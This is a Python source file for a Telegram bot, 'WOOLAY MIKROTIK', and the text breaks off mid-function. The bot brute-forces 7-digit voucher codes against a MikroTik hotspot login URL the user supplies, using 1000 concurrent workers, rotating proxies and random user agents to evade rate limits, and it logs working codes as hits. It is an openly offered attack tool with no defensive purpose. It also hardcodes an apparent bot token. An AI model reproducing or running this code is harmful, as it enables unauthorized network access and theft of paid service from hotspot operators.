#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
  WOOLAY MIKROTIK — Clean Working Version
"""

import os
import sys
import json
import time
import random
import string
import asyncio
import datetime
import warnings
from urllib.parse import urlparse
from typing import Optional, List, Dict, Any, Tuple, Set

warnings.filterwarnings("ignore")

# ── aiohttp ──
import aiohttp

HAS_SOCKS = False
try:
    from aiohttp_socks import ProxyConnector
    HAS_SOCKS = True
except ImportError:
    pass

# ── telegram ──
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
)

# ── flask keep alive ──
from flask import Flask, Response
from threading import Thread

# ═══════════════════════════════════════════════════════════════
#  KEEP ALIVE — Railway / Replit
# ═══════════════════════════════════════════════════════════════

web_app = Flask(__name__)

@web_app.route("/")
def web_home():
    return "WOOLAY alive", 200

@web_app.route("/health")
def web_health():
    return Response("OK", status=200)

def web_run():
    port = int(os.environ.get("PORT", 8080))
    web_app.run(host="0.0.0.0", port=port)

def keep_alive():
    t = Thread(target=web_run, daemon=True)
    t.start()

# ═══════════════════════════════════════════════════════════════
#  OUTPUT
# ═══════════════════════════════════════════════════════════════

try:
    sys.stdout.reconfigure(line_buffering=True)
    sys.stderr.reconfigure(line_buffering=True)
except Exception:
    pass

def log(*args, **kwargs):
    kwargs.setdefault("flush", True)
    print(*args, **kwargs)

RED   = "\x1b[1;31m"
GREEN = "\x1b[1;32m"
YELLOW= "\x1b[33m"
CYAN  = "\x1b[1;36m"
RESET = "\x1b[0m"

# ═══════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════

BOT_TOKEN   = os.environ.get("BOT_TOKEN", "8806693453:AAEK1F7FTsAHMc5PdfeIYeIlWHJgbnGRb8o")
ADMIN_IDS   = [8806693453]
OWNER       = "@Woolay_bot"
OWNER_LINK  = "https://t.me/Woolay_bot"

HIT_FILE    = "hits.txt"
PROXY_FILE  = "proxies.txt"
STATE_FILE  = "state.json"
TRIED_TPL   = "tried_{}.txt"

NUM_WORKERS      = 1000
MAX_CODES_SESSION= 200
COOLDOWN         = 0.001
REST_BETWEEN     = 2
REQ_TIMEOUT      = 15
CONN_LIMIT       = 500
CONN_PER_HOST    = 100
DNS_CACHE_TTL    = 300

CODE_LENGTH      = 7
CODE_TOTAL       = 10 ** CODE_LENGTH

STATE_FLUSH_SEC  = 20
CODE_FLUSH_SEC   = 15

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Nokia5.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
]

# ═══════════════════════════════════════════════════════════════
#  GLOBAL STATE
# ═══════════════════════════════════════════════════════════════

proxy_manager   = None
user_scanners   = {}   # Dict[int, dict]
pending_codes    = {}   # Dict[int, set]

# ═══════════════════════════════════════════════════════════════
#  BANNER
# ═══════════════════════════════════════════════════════════════

def show_banner():
    line = "=" * 55
    log(RED + line)
    log("   WOOLAY MIKROTIK - 1000 WORKERS")
    log(f"   Telegram {OWNER}")
    log(line + RESET)

# ═══════════════════════════════════════════════════════════════
#  STATE FILE
# ═══════════════════════════════════════════════════════════════

def load_all_states() -> dict:
    try:
        if not os.path.exists(STATE_FILE):
            return {}
        with open(STATE_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

def save_all_states(data: dict):
    try:
        tmp = STATE_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        os.replace(tmp, STATE_FILE)
    except Exception:
        pass

def get_saved_state(user_id: int) -> Optional[dict]:
    return load_all_states().get(str(user_id))

def clear_saved_state(user_id: int):
    all_data = load_all_states()
    all_data.pop(str(user_id), None)
    save_all_states(all_data)

def save_current_state(user_id: int, state: dict):
    try:
        hit_details = []
        for h in state.get("hit_details", []):
            t = h.get("time")
            if isinstance(t, datetime.datetime):
                at = t.strftime("%Y-%m-%d %H:%M:%S")
            else:
                at = str(t)
            hit_details.append({"code": h.get("code", "?"), "at": at})

        all_data = load_all_states()
        all_data[str(user_id)] = {
            "url":       state.get("login_url", ""),
            "mode":      state.get("mode", "num7"),
            "counter":   state.get("counter", 0),
            "tried_n":   state.get("tried_n", 0),
            "hits":      state.get("hits", 0),
            "limits":    state.get("limits", 0),
            "net":       state.get("net", 0),
            "failed":    state.get("failed", 0),
            "last_hit":  state.get("last_hit"),
            "started_at": state.get("started_at_str", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
            "hit_details": hit_details,
        }
        save_all_states(all_data)
    except Exception as e:
        log(RED + f"[StateSave] {e}" + RESET)

# ═══════════════════════════════════════════════════════════════
#  TRIED CODES
# ═══════════════════════════════════════════════════════════════

def tried_filename(user_id: int) -> str:
    return TRIED_TPL.format(user_id)

def load_tried_set(user_id: int) -> Set[str]:
    fname = tried_filename(user_id)
    if not os.path.exists(fname):
        return set()
    try:
        with open(fname, "r", errors="ignore") as f:
            return set(line.strip() for line in f if line.strip())
    except Exception:
        return set()

def flush_pending_codes(user_id: int) -> int:
    codes = pending_codes.get(user_id)
    if not codes:
        return 0
    try:
        with open(tried_filename(user_id), "a", encoding="utf-8") as f:
            for c in codes:
                f.write(c + "\n")
        count = len(codes)
        pending_codes[user_id] = set()
        return count
    except Exception:
        return 0

def clear_tried(user_id: int):
    pending_codes.pop(user_id, None)
    try:
        fname = tried_filename(user_id)
        if os.path.exists(fname):
            os.remove(fname)
    except Exception:
        pass

def add_pending(user_id: int, code: str):
    if user_id not in pending_codes:
        pending_codes[user_id] = set()
    pending_codes[user_id].add(code)

# ═══════════════════════════════════════════════════════════════
#  HIT FILE
# ═══════════════════════════════════════════════════════════════

def write_hit(code: str):
    try:
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(HIT_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{now}] {code}\n")
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════
#  BACKGROUND FLUSHER
# ═══════════════════════════════════════════════════════════════

async def code_flush_loop():
    while True:
        try:
            await asyncio.sleep(CODE_FLUSH_SEC)
            for uid in list(pending_codes.keys()):
                flush_pending_codes(uid)
        except asyncio.CancelledError:
            for uid in list(pending_codes.keys()):
                flush_pending_codes(uid)
            raise
        except Exception:
            pass

async def state_flush_loop():
    while True:
        try:
            await asyncio.sleep(STATE_FLUSH_SEC)
            for uid, st in list(user_scanners.items()):
                if st.get("running"):
                    save_current_state(uid, st)
        except asyncio.CancelledError:
            for uid, st in list(user_scanners.items()):
                if st.get("running"):
                    save_current_state(uid, st)
            raise
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════
#  PROXY MANAGER
# ═══════════════════════════════════════════════════════════════

class ProxyManager:
    def __init__(self, filepath: str):
        self.filepath = filepath
        self.proxies: List[str] = []
        self.bad_proxies: Set[str] = set()
        self.lock = asyncio.Lock()
        self.index = 0
        self.load()

    @staticmethod
    def normalize(proxy: str) -> Optional[str]:
        proxy = (proxy or "").strip()
        if not proxy or proxy.startswith("#"):
            return None
        if not proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
            proxy = "socks5://" + proxy
        return proxy

    @staticmethod
    def validate(proxy: str) -> bool:
        try:
            rest = proxy.split("://", 1)[1] if "://" in proxy else proxy
            if "@" in rest:
                rest = rest.split("@", 1)[1]
            host, port = rest.rsplit(":", 1)
            if not host or not port:
                return False
            return 1 <= int(port) <= 65535
        except Exception:
            return False

    def load(self):
        try:
            if not os.path.exists(self.filepath):
                with open(self.filepath, "w"):
                    pass
                self.proxies = []
                return
            with open(self.filepath) as f:
                raw = f.read().splitlines()
            seen = set()
            valid = []
            for line in raw:
                p = self.normalize(line)
                if p and self.validate(p) and p not in seen:
                    seen.add(p)
                    valid.append(p)
            self.proxies = valid
            random.shuffle(self.proxies)
            if self.proxies:
                log(GREEN + f"[Proxy] {len(self.proxies)} loaded" + RESET)
            else:
                log(YELLOW + "[Proxy] DIRECT mode" + RESET)
        except Exception as e:
            log(RED + f"[Proxy] {e}" + RESET)

    def save_file(self):
        try:
            with open(self.filepath, "w") as f:
                f.write("\n".join(self.proxies))
        except Exception:
            pass

    def add_proxies(self, lines: List[str]) -> Tuple[int, int]:
        added = 0
        invalid = 0
        for line in lines:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            p = self.normalize(line)
            if not p or not self.validate(p) or p in self.proxies:
                invalid += 1
                continue
            self.proxies.append(p)
            added += 1
        if added:
            random.shuffle(self.proxies)
            self.save_file()
        return added, invalid

    async def get_next(self) -> Optional[str]:
        async with self.lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return proxy

    async def mark_bad(self, proxy: Optional[str]):
        if not proxy:
            return
        async with self.lock:
            self.bad_proxies.add(proxy)

    def get_count(self) -> int:
        return len(self.proxies)

def get_proxy_manager() -> ProxyManager:
    global proxy_manager
    if proxy_manager is None:
        proxy_manager = ProxyManager(PROXY_FILE)
    return proxy_manager

# ═══════════════════════════════════════════════════════════════
#  MIKROTIK CHECKER
# ═══════════════════════════════════════════════════════════════

async def check_code(session: aiohttp.ClientSession, code: str, url: str, proxy: Optional[str]) -> Tuple[str, Optional[str]]:
    """Check voucher code against MikroTik hotspot.
    Returns: (result, body)
    result: "hit" | "bad" | "limit" | "net" | "failed"
    """
    try:
        parsed = urlparse(url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        login_path = f"{origin}{parsed.path}"
    except Exception:
        origin = url
        login_path = url

    dst = "http://connectivitycheck.gstatic.com/generate_204"
    ua = random.choice(USER_AGENTS)

    headers = {
        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language":           "en-US,en;q=0.9",
        "Cache-Control":             "max-age=0",
        "Connection":                "keep-alive",
        "Content-Type":              "application/x-www-form-urlencoded",
        "Origin":                    origin,
        "Referer":                   url,
        "Upgrade-Insecure-Requests": "1",
        "User-Agent":                ua,
    }

    post_data = {
        "dst":      dst,
        "popup":    "true",
        "username": code,
        "password": "",
    }

    max_retry = 5
    for attempt in range(max_retry):
        try:
            async with session.post(
                login_path,
                data=post_data,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=REQ_TIMEOUT),
                ssl=False,
                allow_redirects=True,
            ) as response:
                body = await response.text()

            lower_body = body.lower()

            # HIT
            if "you are logged in" in lower_body:
                return "hit", body

            # HIT (no error message = possibly valid)
            if ("invalid username or password" not in lower_body
                and "already authorizing" not in lower_body
                and "error" not in lower_body
                and len(body) > 100):
                return "hit", body

            # BAD
            if "invalid username or password" in lower_body:
                return "bad", body

            # LIMIT
            limit_words = ["already authorizing", "retry later", "request limited", "too many"]
            if any(word in lower_body for word in limit_words):
                if attempt < max_retry - 1:
                    await asyncio.sleep(0.5 * (attempt + 1))
                    continue
                return "limit", body

            return "bad", body

        except asyncio.TimeoutError:
            return "net", None
        except (aiohttp.ClientConnectorError, aiohttp.ClientError, OSError):
            return "net", None
        except asyncio.CancelledError:
            raise
        except Exception:
            return "net", None

    return "failed", None

# ═══════════════════════════════════════════════════════════════
#  CODE GENERATION
# ═══════════════════════════════════════════════════════════════

def make_sequential_code(counter: int) -> str:
    return str(counter).zfill(CODE_LENGTH)

def make_random_code() -> str:
    return str(random.randint(0, CODE_TOTAL - 1)).zfill(CODE_LENGTH)

# ═══════════════════════════════════════════════════════════════
#  WORKER
# ═══════════════════════════════════════════════════════════════

async def scanner_worker(worker_id: int, user_id: int):
    pm = get_proxy_manager()
    state = user_scanners.get(user_id)
    if state is None:
        return

    stop_event  = state["stop_event"]
    tried_set   = state["tried_set"]      # Set[str]
    login_url   = state["login_url"]
    mode        = state.get("mode", "num7")

    while not stop_event.is_set():

        proxy = await pm.get_next()

        # Create connector
        connector = None
        try:
            if not proxy:
                connector = aiohttp.TCPConnector(
                    limit=CONN_LIMIT,
                    limit_per_host=CONN_PER_HOST,
                    ttl_dns_cache=DNS_CACHE_TTL,
                    ssl=False,
                    enable_cleanup_closed=True,
                    force_close=True,
                )
            elif HAS_SOCKS:
                connector = ProxyConnector.from_url(
                    proxy,
                    rdns=True,
                    limit=CONN_LIMIT,
                    limit_per_host=CONN_PER_HOST,
                    ttl_dns_cache=DNS_CACHE_TTL,
                    enable_cleanup_closed=True,
                )
        except Exception:
            connector = None

        session = None
        try:
            session = aiohttp.ClientSession(
                connector=connector,
                connector_owner=True,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=REQ_TIMEOUT),
                headers={"User-Agent": random.choice(USER_AGENTS)},
            )

            codes_in_session = 0
            net_failures = 0

            while not stop_event.is_set() and codes_in_session < MAX_CODES_SESSION:

                # Generate code
                if mode == "num7":
                    state["counter"] += 1
                    if state["counter"] >= CODE_TOTAL:
                        break
                    code = make_sequential_code(state["counter"])
                else:
                    code = make_random_code()

                # Skip already tried
                if code in tried_set:
                    continue

                tried_set.add(code)
                add_pending(user_id, code)
                state["current_code"] = code

                # Check
                result, body = await check_code(session, code, login_url, proxy)
                codes_in_session += 1
                state["tried_n"] += 1

                if result == "hit":
                    state["hits"] += 1
                    state["hit_list"].append(code)
                    state["last_hit"] = code
                    state["recent_logs"].append(f"🔥 HIT: {code}")
                    state["hit_details"].append({
                        "code": code,
                        "time": datetime.datetime.now(),
                    })
                    write_hit(code)
                    flush_pending_codes(user_id)
                    save_current_state(user_id, state)

                elif result == "limit":
                    state["limits"] += 1
                    state["recent_logs"].append("⚠️ LIMIT")
                    break

                elif result == "net":
                    state["net"] += 1
                    net_failures += 1
                    if net_failures >= 3:
                        await pm.mark_bad(proxy)
                        break
                    break

                elif result == "failed":
                    state["failed"] += 1
                    break

                else:
                    # "bad" - normal, keep going
                    pass

                if stop_event.is_set():
                    break

                await asyncio.sleep(COOLDOWN)

        except asyncio.CancelledError:
            raise
        except Exception:
            state["net"] += 1
        finally:
            if session is not None:
                try:
                    await session.close()
                except Exception:
                    pass

        if stop_event.is_set():
            break

        await asyncio.sleep(REST_BETWEEN)

# ═══════════════════════════════════════════════════════════════
#  DASHBOARD
# ═══════════════════════════════════════════════════════════════

def build_hits_text(hit_details: list, total_hits: int, max_show: int = 30) -> str:
    lines = []
    for h in hit_details:
        code = h.get("code", "?")
        lines.append(f"  ▸ <code>{code}</code>")
    if not lines:
        return "🎁 <b>HITS • 0</b>\n┌──────────────┐\n  💀 None yet\n└──────────────┘"
    if len(lines) > max_show:
        hidden = len(lines) - max_show
        lines = [f"  … +{hidden} more"] + lines[-max_show:]
    body = "\n".join(lines)
    return f"🎁 <b>HITS • {total_hits}</b>\n┌──────────────┐\n{body}\n└──────────────┘"

async def dashboard_updater(context, user_id: int):
    state = user_scanners.get(user_id)
    if state is None:
        return
    stop_event = state["stop_event"]
    dash_msg_id = state.get("dash_msg_id")
    pm = get_proxy_manager()

    try:
        while not stop_event.is_set():
            await asyncio.sleep(3)
            if stop_event.is_set():
                break

            elapsed = max(time.time() - state["start_time"], 1)
            speed_cpm = int(state["tried_n"] / elapsed * 60)
            proxy_count = pm.get_count()
            recent = state["recent_logs"][-1:] if state["recent_logs"] else ["🔍 searching..."]
            last_log = recent[-1]
            proxy_mode = f"🕷️ {proxy_count}" if proxy_count > 0 else "⚡ DIRECT"

            hits_text = build_hits_text(state.get("hit_details", []), state["hits"])

            text = (
                "╔═════════════════════════╗\n"
                "║  ⚡ <b>WOOLAY MIKROTIK</b> ⚡  ║\n"
                "║     7 DIGIT SCANNER     ║\n"
                "╚═════════════════════════╝\n\n"
                "🔍 <b>SEARCHING...</b>\n\n"
                "📊 <b>STATS</b>\n"
                f"├ 💡 Tested  <code>{state['tried_n']:,}</code>\n"
                f"├ 👊🏻 Hits    <code>{state['hits']}</code>\n"
                f"├ ⚠️ Limits  <code>{state['limits']}</code>\n"
                f"└ ❌ Errors  <code>{state['net']}</code>\n\n"
                "⚡ <b>SPEED</b>\n"
                f"├ 🧑🏻‍💻 <code>{speed_cpm:,} c/m</code>\n"
                f"├ 👥 Workers <code>{NUM_WORKERS}</code>\n"
                f"└ ☠️ <code>{proxy_mode}</code>\n\n"
                "🎯 <b>NOW</b>\n"
                f"├ 🕴🏻 Code    <code>{state.get('current_code') or '—'}</code>\n"
                f"├ ⚓ LastHit <code>{state.get('last_hit') or '—'}</code>\n"
                f"└ 🌳 Log     <code>{last_log}</code>\n\n"
                f"{hits_text}\n\n"
                f"╭─ ⚡ WOOLAY · {OWNER} ─╮"
            )

            markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("🛑 STOP SCAN", callback_data="stop_scan")]
            ])

            try:
                await context.bot.edit_message_text(
                    chat_id=user_id,
                    message_id=dash_msg_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=markup,
                )
            except Exception:
                pass

    except asyncio.CancelledError:
        raise

async def dashboard_final(context, user_id: int, state: dict):
    pm = get_proxy_manager()
    proxy_count = pm.get_count()
    elapsed = max(time.time() - state["start_time"], 1)
    speed_cpm = int(state["tried_n"] / elapsed * 60)
    proxy_mode = f"🕷️ {proxy_count}" if proxy_count > 0 else "⚡ DIRECT"

    hits_text = build_hits_text(state.get("hit_details", []), state["hits"], max_show=90)

    text = (
        "╔═════════════════════════╗\n"
        "║   💀 <b>SCAN STOPPED</b> 💀   ║\n"
        "║      ⚡ <b>WOOLAY</b> ⚡      ║\n"
        "╚═════════════════════════╝\n\n"
        "📊 <b>FINAL</b>\n"
        f"├ 💡 Tested  <code>{state['tried_n']:,}</code>\n"
        f"├ 👊🏻 Hits    <code>{state['hits']}</code>\n"
        f"├ ⚠️ Limits  <code>{state['limits']}</code>\n"
        f"├ ❌ Errors  <code>{state['net']}</code>\n"
        f"├ 🧑🏻‍💻 Speed   <code>{speed_cpm:,} c/m</code>\n"
        f"└ 🌾 <code>{proxy_mode}</code>\n\n"
        f"{hits_text}\n\n"
        "💾 <i>Saved — /start to resume</i>\n\n"
        f"╭─ ☠️ WOOLAY · {OWNER} ─╮"
    )

    markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("🖕🏻 BACK", callback_data="btn_back")]
    ])

    try:
        await context.bot.edit_message_text(
            chat_id=user_id,
            message_id=state["dash_msg_id"],
            text=text,
            parse_mode=ParseMode.HTML,
            reply_markup=markup,
        )
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════
#  STOP
# ═══════════════════════════════════════════════════════════════

async def stop_scanner(user_id: int, context=None) -> bool:
    state = user_scanners.get(user_id)
    if not state or not state.get("running"):
        return False

    log(YELLOW + f"[STOP] User {user_id}" + RESET)
    state["stop_event"].set()

    await asyncio.sleep(2)

    flush_pending_codes(user_id)
    save_current_state(user_id, state)

    if context is not None:
        try:
            await dashboard_final(context, user_id, state)
        except Exception:
            pass

    state["running"] = False
    return True

# ═══════════════════════════════════════════════════════════════
#  RUN SCANNER
# ═══════════════════════════════════════════════════════════════

async def run_scanner(context, user_id: int):
    if user_scanners.get(user_id, {}).get("running"):
        return

    pm = get_proxy_manager()
    login_url = context.user_data.get("login_url", "")

    if not login_url:
        await context.bot.send_message(
            user_id,
            "❌ Login URL ထည့်ပါ!\n🔮 LOGIN URL ကို နှိပ်ပါ",
            parse_mode=ParseMode.HTML,
        )
        return

    # Resume check
    saved = get_saved_state(user_id)
    resume = False

    if saved and saved.get("url") == login_url:
        resume = True
        log(CYAN + f"[Resume] User {user_id}" + RESET)
    elif saved:
        clear_saved_state(user_id)
        clear_tried(user_id)
        saved = None

    if resume and saved:
        tried_set = load_tried_set(user_id)
        hit_details = []
        for h in saved.get("hit_details", []):
            try:
                t = datetime.datetime.strptime(h.get("at", ""), "%Y-%m-%d %H:%M:%S")
            except Exception:
                t = datetime.datetime.now()
            hit_details.append({"code": h.get("code", "?"), "time": t})

        mode      = saved.get("mode", "num7")
        counter   = saved.get("counter", 0)
        tried_n   = saved.get("tried_n", 0)
        hits      = saved.get("hits", 0)
        limits    = saved.get("limits", 0)
        net       = saved.get("net", 0)
        failed    = saved.get("failed", 0)
        last_hit  = saved.get("last_hit")
        started_at = saved.get("started_at", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    else:
        tried_set   = set()
        hit_details = []
        mode      = context.user_data.get("mode", "num7")
        counter   = 0
        tried_n   = 0
        hits      = 0
        limits    = 0
        net       = 0
        failed    = 0
        last_hit  = None
        started_at = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Build state dict — NO duplicate keys
    state = {
        "running":       True,
        "login_url":     login_url,
        "mode":          mode,
        "counter":       counter,
        "stop_event":    asyncio.Event(),
        "tried_n":       tried_n,          # int: count of tried codes
        "hits":          hits,             # int: count of hits
        "limits":        limits,
        "net":           net,
        "failed":        failed,
        "hit_list":      [h["code"] for h in hit_details],
        "tried_set":     tried_set,        # set: tried code strings
        "recent_logs":   [],
        "last_hit":      last_hit,
        "current_code":  None,
        "start_time":    time.time(),
        "hit_details":   hit_details,
        "started_at_str": started_at,
    }
    user_scanners[user_id] = state

    # Send dashboard message
    start_text = "🔁 <b>RESUMING...</b>" if resume else "⚡ <b>Starting...</b>"
    dash_msg = await context.bot.send_message(user_id, start_text, parse_mode=ParseMode.HTML)
    state["dash_msg_id"] = dash_msg.message_id

    save_current_state(user_id, state)

    # Create workers
    tasks = []
    for i in range(NUM_WORKERS):
        task = asyncio.create_task(scanner_worker(i, user_id))
        tasks.append(task)

    # Dashboard updater
    dash_task = asyncio.create_task(dashboard_updater(context, user_id))
    tasks.append(dash_task)

    state["tasks"] = tasks

    try:
        await state["stop_event"].wait()
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

        flush_pending_codes(user_id)
        save_current_state(user_id, state)

        try:
            await dashboard_final(context, user_id, state)
        except Exception:
            pass

        state["running"] = False

# ═══════════════════════════════════════════════════════════════
#  KEYBOARDS
# ═══════════════════════════════════════════════════════════════

MODES = {
    "num7":  "🩸 07 Sequential",
    "rand7": "🎲 07 Random",
}

def main_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🌳 LOGIN URL", callback_data="btn_url"),
            InlineKeyboardButton("📜 MODES", callback_data="btn_mode"),
        ],
        [
            InlineKeyboardButton("☠️ START", callback_data="btn_start"),
            InlineKeyboardButton("🛑 STOP", callback_data="stop_scan"),
        ],
        [
            InlineKeyboardButton("🕴🏻 STATUS", callback_data="btn_status"),
            InlineKeyboardButton("🧹 CLEAR", callback_data="btn_clear"),
        ],
        [
            InlineKeyboardButton("🤖 PROXIES", callback_data="btn_proxy"),
        ],
        [
            InlineKeyboardButton("☠️ WOOLAY ☠️", url=OWNER_LINK),
        ],
    ])

def mode_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🩸 07 Sequential", callback_data="m_num7"),
            InlineKeyboardButton("🎲 07 Random", callback_data="m_rand7"),
        ],
        [
            InlineKeyboardButton("🖕🏻 BACK", callback_data="btn_back"),
        ],
    ])

def back_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🖕🏻 BACK", callback_data="btn_back")],
    ])

def build_menu_text(mode: str, proxy_count: int, login_url: str, user_id: int) -> str:
    if proxy_count > 0:
        proxy_line = f"🕷️ Proxies: <code>{proxy_count}</code>"
    else:
        proxy_line = "⚡ Direct Mode"

    if login_url:
        url_line = f"🔥 URL: ✅\n<code>{login_url}</code>"
    else:
        url_line = "❌ URL: Not set"

    resume_line = ""
    saved = get_saved_state(user_id)
    if saved and saved.get("url") == login_url:
        resume_line = (
            f"\n💾 <b>Saved Job</b>\n"
            f"├ Tried: <code>{saved.get('tried_n', 0):,}</code>\n"
            f"├ Hits:  <code>{saved.get('hits', 0)}</code>\n"
            f"└ Mode:  <code>{MODES.get(saved.get('mode', 'num7'), '')}</code>\n"
        )

    return (
        "╔═════════════════════════╗\n"
        "║     ☠️ <b>WOOLAY</b> ☠️       ║\n"
        "║  MIKROTIK × 7 DIGIT   ║\n"
        "╚═════════════════════════╝\n\n"
        f"📜 Mode: <code>{MODES.get(mode, mode)}</code>\n"
        f"{proxy_line}\n"
        f"⚡ Workers: <code>{NUM_WORKERS}</code>\n"
        f"{url_line}\n"
        f"{resume_line}\n"
        "💡 <i>/stop to stop scan</i>"
    )

# ═══════════════════════════════════════════════════════════════
#  COMMAND HANDLERS
# ═══════════════════════════════════════════════════════════════

async def cmd_start(update, context):
    user_id = update.effective_user.id

    # Initialize user_data
    if "mode" not in context.user_data:
        context.user_data["mode"] = "num7"
    if "login_url" not in context.user_data:
        context.user_data["login_url"] = ""

    pm = get_proxy_manager()
    mode = context.user_data["mode"]
    login_url = context.user_data["login_url"]

    text = build_menu_text(mode, pm.get_count(), login_url, user_id)
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=main_keyboard())

async def cmd_stop(update, context):
    """ /stop command to stop scanning """
    user_id = update.effective_user.id
    stopped = await stop_scanner(user_id, context)
    if stopped:
        await update.message.reply_text(
            "🛑 <b>SCAN STOPPED</b>\n\n💾 Saved\n💡 /start to resume",
            parse_mode=ParseMode.HTML,
        )
    else:
        await update.message.reply_text(
            "⚠️ No scan running",
            parse_mode=ParseMode.HTML,
        )

# ═══════════════════════════════════════════════════════════════
#  CALLBACK HANDLER
# ═══════════════════════════════════════════════════════════════

async def on_callback(update, context):
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    data = query.data

    # Ensure user_data defaults
    if "mode" not in context.user_data:
        context.user_data["mode"] = "num7"
    if "login_url" not in context.user_data:
        context.user_data["login_url"] = ""

    if data == "btn_back":
        pm = get_proxy_manager()
        mode = context.user_data["mode"]
        login_url = context.user_data["login_url"]
        text = build_menu_text(mode, pm.get_count(), login_url, user_id)
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=main_keyboard())

    elif data == "btn_url":
        context.user_data["awaiting_url"] = True
        current = context.user_data.get("login_url", "Not set")
        await query.edit_message_text(
            f"🔮 <b>Send Login URL</b>\n\nCurrent:\n<code>{current}</code>\n\nNew URL:",
            parse_mode=ParseMode.HTML,
            reply_markup=back_keyboard(),
        )

    elif data == "btn_mode":
        await query.edit_message_text(
            "📜 <b>Select Mode</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=mode_keyboard(),
        )

    elif data.startswith("m_"):
        mode = data[2:]
        context.user_data["mode"] = mode
        pm = get_proxy_manager()
        login_url = context.user_data["login_url"]
        text = build_menu_text(mode, pm.get_count(), login_url, user_id)
        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=main_keyboard())

    elif data == "btn_start":
        if user_scanners.get(user_id, {}).get("running"):
            await query.answer("⚠️ Already running!", show_alert=True)
            return
        login_url = context.user_data.get("login_url", "")
        if not login_url:
            await query.answer("❌ Set URL first!", show_alert=True)
            return
        await query.edit_message_text("⚡ <b>Starting...</b>", parse_mode=ParseMode.HTML)
        asyncio.create_task(run_scanner(context, user_id))

    elif data == "stop_scan":
        stopped = await stop_scanner(user_id, context)
        if stopped:
            await query.answer("🛑 Stopped!")
        else:
            await query.answer("Not running", show_alert=True)

    elif data == "btn_status":
        pm = get_proxy_manager()
        await query.edit_message_text(
            f"🕷️ <b>Proxy Status</b>\n\nActive: <code>{pm.get_count()}</code>\nBad: <code>{len(pm.bad_proxies)}</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=back_keyboard(),
        )

    elif data == "btn_clear":
        pm = get_proxy_manager()
        pm.proxies = []
        pm.bad_proxies = set()
        pm.save_file()
        await query.edit_message_text(
            "🧹 <b>Proxies Cleared</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=back_keyboard(),
        )

    elif data == "btn_proxy":
        context.user_data["awaiting_proxy"] = True
        await query.edit_message_text(
            "🕷️ <b>Send proxies</b> (one per line)\n\nFormat:\n<code>host:port</code>\n<code>host:port:user:pass</code>\n<code>socks5://host:port</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=back_keyboard(),
        )

# ═══════════════════════════════════════════════════════════════
#  MESSAGE HANDLER
# ═══════════════════════════════════════════════════════════════

async def on_message(update, context):
    user_id = update.effective_user.id
    text = update.message.text

    if context.user_data.get("awaiting_url"):
        context.user_data["awaiting_url"] = False
        context.user_data["login_url"] = text.strip()
        pm = get_proxy_manager()
        mode = context.user_data.get("mode", "num7")
